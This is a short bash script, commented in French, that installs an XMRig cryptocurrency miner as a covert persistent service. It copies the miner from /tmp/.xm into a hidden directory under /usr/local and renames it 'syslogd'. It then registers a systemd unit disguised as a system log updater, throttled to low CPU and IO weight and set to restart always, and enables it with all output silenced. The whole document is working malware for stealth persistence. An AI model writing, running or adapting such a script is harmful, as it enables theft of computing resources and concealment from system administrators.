#!/bin/bash

# Répertoire système caché
INSTALL_DIR="/usr/local/.sysdaemon"
SERVICE_NAME="syslogd-update.service"

mkdir -p "$INSTALL_DIR" >/dev/null 2>&1
cp /tmp/.xm/xmrig "$INSTALL_DIR/syslogd" >/dev/null 2>&1
cp /tmp/.xm/config.json "$INSTALL_DIR/config.json" >/dev/null 2>&1
chmod +x "$INSTALL_DIR/syslogd"

# Crée un service systemd furtif
cat > /etc/systemd/system/$SERVICE_NAME <<EOF
[Unit]
Description=System Log Daemon Update
After=network.target

[Service]
ExecStart=$INSTALL_DIR/syslogd -c $INSTALL_DIR/config.json
Restart=always
Nice=10
CPUWeight=1
IOWeight=1

[Install]
WantedBy=multi-user.target
EOF

# Active et démarre silencieusement le service
systemctl daemon-reexec >/dev/null 2>&1
systemctl daemon-reload >/dev/null 2>&1
systemctl enable $SERVICE_NAME >/dev/null 2>&1
systemctl start $SERVICE_NAME >/dev/null 2>&1
